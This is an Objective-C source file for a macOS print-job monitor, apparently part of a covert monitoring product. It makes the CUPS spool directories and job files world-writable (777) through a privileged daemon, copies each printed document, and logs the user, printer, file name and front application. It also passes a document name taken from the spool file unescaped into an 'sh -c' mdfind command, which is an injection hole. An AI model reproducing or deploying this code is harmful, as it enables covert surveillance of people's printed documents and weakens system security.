//
//  PrinterMonitorNotify.m
//  PrinterMonitorManager
//
//  Created by ophat on 11/12/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "PrinterMonitorNotify.h"
#import "MessagePortIPCSender.h"
#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"
#import "FxPrintJobEvent.h"

#define kMaxWait                 10
#define kPrinterBundleID         @"com.apple.print.PrinterProxy"
#define kDefaultPrinterFile      @"/private/var/spool/cups/"
#define kDefaultPrinterCachePath @"/private/var/spool/cups/cache"
#define kDefaultPrinterCache     @"/private/var/spool/cups/cache/job.cache"

#define kReadWriteReadWriteReadWrite 777
@implementation PrinterMonitorNotify
@synthesize mWatchlist, mStream, mCurrentRunloopRef;
@synthesize mJobPath,mJobID;
@synthesize mAppID, mAppName,mHistory;
@synthesize mDelegate, mSelector;
id _mPrinterMonitor;

-(id) init{
    if (self = [super init]) {
        _mPrinterMonitor = self;
        mWatchlist = [[NSMutableArray alloc] init];
        mJobID     = [[NSMutableArray alloc] init];
        mJobPath   = [[NSMutableArray alloc] init];
        mAppID     = [[NSMutableArray alloc] init];
        mAppName   = [[NSMutableArray alloc] init];
        mHistory   = [[NSMutableArray alloc] init];
        
        [mWatchlist addObject:[NSString stringWithFormat:@"%@",kDefaultPrinterFile]];
        
    }
    return self;
}

-(void) startCapture{
    [self stopCapture];
    
    DLog(@"#### PrintJob startCapture");
    BOOL isChgPermission = false;
    
    int wait = 0;
    
    while ( !isChgPermission ) {
        DLog(@"#### PrintJob Waiting For Permission");
        
        [self sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterFile withPermission:kReadWriteReadWriteReadWrite];
        [self sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterCachePath withPermission:kReadWriteReadWriteReadWrite];
      
        sleep(1.0);
        
        NSFileManager * file = [NSFileManager defaultManager];
        NSString * path = @"/private/var/spool/cups/";
        NSDictionary *attrs = [file attributesOfItemAtPath: path error: NULL];
        DLog(@"#### PrintJob attrs %@",attrs);
        if ([[self symbolicPermissionFromInteger:[[attrs objectForKey:@"NSFilePosixPermissions"] intValue]] isEqualTo:@"rwxrwxrwx"]) {
            isChgPermission = true;
            break;
        }
        if (wait == kMaxWait) {
            break;
        }
        wait++;
    }

    [self watchThisPath:self.mWatchlist];
}

-(void) stopCapture{
    if (mStream != nil && mCurrentRunloopRef != nil) {
        DLog(@"#### PrintJob stopCapture");
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        [self.mWatchlist removeAllObjects];
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

#pragma mark ### watcher

-(void) watchThisPath:(NSMutableArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil && mCurrentRunloopRef != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
    }
    
    if([mWatchlist count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileChangeEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        0.5,
                                        kFSEventStreamCreateFlagWatchRoot
                                        | kFSEventStreamCreateFlagUseCFTypes
                                        | kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
        DLog(@"#### PrintJob mPathsToWatch %@",afileInputPath);
    }
    
}
#pragma mark ### fileChangeEvent

static void fileChangeEvent(ConstFSEventStreamRef streamRef,
                            void* callBackInfo,
                            size_t numEvents,
                            void* eventPaths,
                            const FSEventStreamEventFlags eventFlags[],
                            const FSEventStreamEventId eventIds[]) {
    
    [_mPrinterMonitor sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterFile withPermission:kReadWriteReadWriteReadWrite];
    [_mPrinterMonitor sendToDaemonWithToChangePermissionWithPath:kDefaultPrinterCachePath withPermission:kReadWriteReadWriteReadWrite];
    
    NSArray * paths = (__bridge NSArray*)eventPaths;
    
    for (int i=0; i< [paths count] ; i++ ){

        NSString * filePath = [NSString stringWithFormat:@"%@",[paths objectAtIndex:i]];
        filePath = [filePath stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
        
        if ([filePath rangeOfString:@".DS_Store"].location == NSNotFound) {

            if ([[_mPrinterMonitor regex:[NSString stringWithFormat:@"%@d.*",kDefaultPrinterFile] withString:filePath] length] > 0) {
                [_mPrinterMonitor getSeqNum:filePath];
            }
            
            if ([[_mPrinterMonitor regex:[NSString stringWithFormat:@"%@c.*",kDefaultPrinterFile] withString:filePath] length] > 0) {
                 [_mPrinterMonitor sendToDaemonWithToChangePermissionWithPath:filePath withPermission:kReadWriteReadWriteReadWrite];
            }
            
            if ([filePath isEqualToString:kDefaultPrinterCache]){
                [_mPrinterMonitor readData:filePath];
            }
        }
    }
    
}
-(void) getSeqNum:(NSString *)aFile{
    NSFileManager * fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:aFile]) {
        
        NSArray * spliter = [aFile componentsSeparatedByString:@"/"];
        NSString * seq = [spliter objectAtIndex:([spliter count]-1)];
        seq = [seq stringByReplacingOccurrencesOfString:@"d" withString:@""];
        seq = [[seq componentsSeparatedByString:@"-"] objectAtIndex:0];

        if (![mJobID containsObject:[NSString stringWithFormat:@"%d",[seq intValue]]]) {
            NSString * copyPath = [NSString stringWithFormat:@"%@_temp",aFile];
            
            [self sendToDaemonWithToChangePermissionWithPath:aFile withPermission:kReadWriteReadWriteReadWrite];
            [self sendToDaemonWithToCopyItemFrom:aFile To:copyPath];
            
            DLog(@"####### RunScript");
            
            NSAppleScript *scptFrontName =[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n set x to name of processes whose frontmost is true \n set o to bundle identifier of processes whose frontmost is true \n return {x, o} \n end tell"];
            
            NSAppleEventDescriptor *result = [scptFrontName executeAndReturnError:nil];

            NSString * frontMostName = [[NSString alloc]initWithString:[[result descriptorAtIndex:1]stringValue]];
            NSString * frontMostID = [[NSString alloc]initWithString:[[result descriptorAtIndex:2]stringValue]];
            [scptFrontName release];
            
            [mJobID addObject:[NSString stringWithFormat:@"%d",[seq intValue]]];
            
            [mJobPath addObject:copyPath];
            
            [mAppID addObject:frontMostID];
            [mAppName addObject:frontMostName];
            
            [frontMostName release];
            [frontMostID release];
            
            DLog(@"############### mJobID %@ ",mJobID);
            DLog(@"############### mJobPath %@ ",mJobPath);
            DLog(@"############### PrintedID %@ in queue",seq);
        }
    }
}

-(void)readData:(NSString *)path {
    if ([mDelegate respondsToSelector:mSelector] ){
        NSFileManager * fm = [NSFileManager defaultManager];
        NSString * content = [[NSString alloc]initWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
   
        for (int i=0; i < [mJobID count]; i++) {
            if ([fm fileExistsAtPath:[mJobPath objectAtIndex:i]]) {
                NSString * seq = [[NSString alloc]initWithString:[NSString stringWithFormat:@"<Job %@>",[mJobID objectAtIndex:i]]];
               
                NSString * temp_master = [[content componentsSeparatedByString:seq] objectAtIndex:1];
                NSString * master = [[NSString alloc]initWithString: [NSString stringWithFormat:@"%@",[[temp_master componentsSeparatedByString:@"</Job>"] objectAtIndex:0]]];
                
                NSString *owner = @"";
                if ([master rangeOfString:@"Username"].location != NSNotFound) {
                    owner = [[master componentsSeparatedByString:@"Username"] objectAtIndex:1];
                    owner = [[owner componentsSeparatedByString:@"\n"] objectAtIndex:0];
                    owner = [owner stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                }
                
                NSString * printerName = @"";
                if ([master rangeOfString:@"Destination"].location != NSNotFound) {
                    printerName = [[master componentsSeparatedByString:@"Destination"] objectAtIndex:1];
                    printerName = [[printerName componentsSeparatedByString:@"\n"] objectAtIndex:0];
                    printerName = [printerName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                }
                
                NSString * summitTime = @"";
                if ([master rangeOfString:@"Completed"].location != NSNotFound) {
                    summitTime = [[master componentsSeparatedByString:@"Completed"] objectAtIndex:1];
                    summitTime = [[summitTime componentsSeparatedByString:@"\n"] objectAtIndex:0];
                    summitTime = [summitTime stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                    summitTime = [self GetDateFromTimeInterval:[summitTime intValue]];
                }
                if ([summitTime length] == 0) {
                    summitTime = [DateTimeFormat phoenixDateTime];
                }
                
                int totalPage = 0;
//                NSString * cPath = [[mJobPath objectAtIndex:i] stringByReplacingOccurrencesOfString:@"-001_temp" withString:@""];
//                cPath = [cPath stringByReplacingOccurrencesOfString:@"d" withString:@"c"];
//                NSString * temp_totalPage_Content = [[NSString alloc]initWithContentsOfFile:cPath encoding:NSASCIIStringEncoding error:nil];
//                if([temp_totalPage_Content rangeOfString:@"com.apple.print.PrintSettings.PMCopies..n."].location != NSNotFound){
//                    NSMutableArray * array_temp = [[NSMutableArray alloc]initWithArray:[temp_totalPage_Content componentsSeparatedByString:@"com.apple.print.PrintSettings.PMCopies..n."]];
//                    NSString * temp = [[[array_temp objectAtIndex:1] componentsSeparatedByString:@"\""] objectAtIndex:0];
//                    NSString *clearInvisible = [temp substringWithRange: NSMakeRange (1, [temp length]-1)];
//                    clearInvisible = [clearInvisible substringWithRange: NSMakeRange (1, [clearInvisible length]-1)];
//                    totalPage = [clearInvisible intValue];
//                    [array_temp release];
//                }
//                [temp_totalPage_Content release];

                NSString * info = [[NSString alloc]initWithContentsOfFile:[mJobPath objectAtIndex:i] encoding:NSASCIIStringEncoding  error:nil];

                if (info != nil) {
                    NSString * fileName = @"";
                    int fileSize = 0;
                    NSString * filePath = @"";
                    
                    fileName = [[info componentsSeparatedByString:@"obj\n("] objectAtIndex:1];
                    fileName = [[fileName componentsSeparatedByString:@")\n"] objectAtIndex:0];
                    fileName = [fileName stringByReplacingOccurrencesOfString:@"\\" withString:@""];
                    
                    DLog(@"### fileName %@",fileName);

                    if ([fileName rangeOfString:@"."].location == NSNotFound) {
                        filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@.*'\" -onlyin ~",fileName]];
                        filePath = [[filePath componentsSeparatedByString:@"\n"] objectAtIndex:0];
                        filePath = [filePath stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                        if ([filePath length] == 0 ) {
                            filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@*'\" -onlyin ~",fileName]];
                        }
                    }else{
                        filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@*'\" -onlyin ~",fileName]];
                    }
                    
                    filePath       =   [NSString stringWithFormat:@"%@",[[filePath componentsSeparatedByString:@"\n"] objectAtIndex:0]];
                    if ([filePath length]>0) {
                        NSArray * lastone = [filePath componentsSeparatedByString:@"/"];
                        fileName = [NSString stringWithFormat:@"%@",[lastone objectAtIndex:[lastone count]-1]];
                    }else{
                        fileName = [NSString stringWithFormat:@"Printed_%@.pdf",[mJobID objectAtIndex:i]];
                        filePath = [mJobPath objectAtIndex:i];
                    }
                    
                    NSDictionary *attrs = [fm attributesOfItemAtPath:filePath error: nil];
        
                    fileSize = [[NSString stringWithFormat:@"%@",[attrs objectForKey:@"NSFileSize"]] intValue];
                    
                    DLog(@"######### PrintedData");
                    DLog(@"DateTime     [%@] %@",[[DateTimeFormat phoenixDateTime]class],[DateTimeFormat phoenixDateTime]);
                    DLog(@"appID        [%@] %@",[[mAppID objectAtIndex:i]class],[mAppID objectAtIndex:i]);
                    DLog(@"appName      [%@] %@",[[mAppName objectAtIndex:i]class],[mAppName objectAtIndex:i]);
                    DLog(@"jobID        [%@] %@",[[mJobID objectAtIndex:i]class],[mJobID objectAtIndex:i]);
                    DLog(@"owner        [%@] %@",[owner class],owner);
                    DLog(@"printerName  [%@] %@",[printerName class],printerName);
                    DLog(@"documentName [%@] %@",[fileName class],fileName);
                    DLog(@"summitTime   [%@] %@",[summitTime class],summitTime);
                    DLog(@"filePath     [%@] %@",[filePath class],filePath);
                    DLog(@"TotalPage     %d",totalPage); // -| totalpage 0
                    DLog(@"TotalByte     %d",fileSize);
                    DLog(@"###########################");
                    
                    NSString * currentPrintedData = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@|%@|%@|%@|%@|%d|%@",[SystemUtilsImpl userLogonName]
                                                                                                                                      ,[mJobID objectAtIndex:i]
                                                                                                                                      ,printerName
                                                                                                                                      ,fileName
                                                                                                                                      ,summitTime
                                                                                                                                      ,fileSize
                                                                                                                                      ,filePath]];
                    if (![mHistory containsObject:currentPrintedData] ) {
                        
                        FxPrintJobEvent * printJobEvent = [[FxPrintJobEvent alloc] init];
                        [printJobEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                        [printJobEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                        [printJobEvent setMApplicationName:[mAppName objectAtIndex:i]];
                        [printJobEvent setMApplicationID:[mAppID objectAtIndex:i]];
                        [printJobEvent setMTitle:@""];
                        [printJobEvent setMJobID:[mJobID objectAtIndex:i]];
                        [printJobEvent setMOwnerName:owner];
                        [printJobEvent setMPrinter:printerName];
                        [printJobEvent setMDocumentName:fileName];
                        [printJobEvent setMSubmitTime:summitTime];
                        [printJobEvent setMTotalPage:totalPage];
                        [printJobEvent setMTotalByte:fileSize];
                        [printJobEvent setMPathToData:filePath];
                        
                        [mDelegate performSelector:mSelector withObject:printJobEvent];
                        [printJobEvent release];
                        
                        [mHistory addObject:currentPrintedData];
                        
                    }else{
                        DLog(@"@@@@ Duplicate No Capture ");
                    }
                    
                    [currentPrintedData release];
                }else{
                    DLog(@"##### No info");
                }

                [master release];
                [info release];
                [seq release];
            }else{
               DLog(@"##### File doesn't exist");
            }
            
            [mJobID removeObjectAtIndex:i];
            [mJobPath removeObjectAtIndex:i];
            [mAppName removeObjectAtIndex:i];
            [mAppID removeObjectAtIndex:i];
            i--;
        }
        [content release];
    }
}


#pragma mark #Ultility

-(NSString *)regex:(NSString *)aReg withString:(NSString *)aString{
    NSError  *error = nil;
    NSRegularExpression* regex = [NSRegularExpression regularExpressionWithPattern: aReg options:0 error:&error];
    NSArray* matches = [regex matchesInString:aString options:0 range: NSMakeRange(0, [aString length])];
    NSString *duplicateString = @"";
    for (NSTextCheckingResult* match in matches) {
        duplicateString = [aString substringWithRange:[match range]];
    }
    return duplicateString;
}

-(NSString *)GetDateFromTimeInterval:(int)aTime{
    NSDate *lastUpdate = [[NSDate alloc] initWithTimeIntervalSince1970:aTime];
    
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateStyle:NSDateFormatterMediumStyle];
    [dateFormatter setTimeStyle:NSDateFormatterMediumStyle];
    [dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
   
    NSString * returnString = [[NSString alloc]initWithString:[dateFormatter stringFromDate:lastUpdate]];
    
    [dateFormatter release];
    [lastUpdate release];
    DLog(@"returnString %@",returnString);
    return [returnString autorelease];
}

#pragma mark #CommandRunner

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

#pragma mark -Symbolic
- (NSString *)symbolicPermissionFromInteger:(int) p {
    char s[12];
    strmode(p, s);
    NSString * Permission = [[NSString stringWithUTF8String: s] stringByReplacingOccurrencesOfString:@"?" withString:@""];
    Permission = [Permission stringByReplacingOccurrencesOfString:@" " withString:@""];
    return Permission;
}

#pragma mark -IPC Sender

-(void)sendToDaemonWithToChangePermissionWithPath:(NSString *)aPath withPermission:(int)aPermission{
    DLog(@"::==> sendToDaemonWithToChangePermissionWithPath %@ %d",aPath,aPermission);

    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"chgownerattr"forKey:@"type"];
    [myCommand setObject:aPath forKey:@"path"];
    [myCommand setObject:[NSString stringWithFormat:@"%d",aPermission] forKey:@"permission"];

    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];

    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void)sendToDaemonWithToCopyItemFrom:(NSString *)aFPath To:(NSString *)aTPath{
    DLog(@"::==> sendToDaemonWithToCopyItemFrom %@ > %@",aFPath,aTPath);
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"copyitem_printer"forKey:@"type"];
    [myCommand setObject:aFPath forKey:@"fpath"];
    [myCommand setObject:aTPath forKey:@"tpath"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}
#pragma mark #Destroy

-(void)dealloc {
    mStream = nil;
    mCurrentRunloopRef = nil;
    [mWatchlist release];
    [mJobID release];
    [mJobPath release];
    [mAppID release];
    [mAppName release];
    [mHistory release];
    [super dealloc];
}
@end
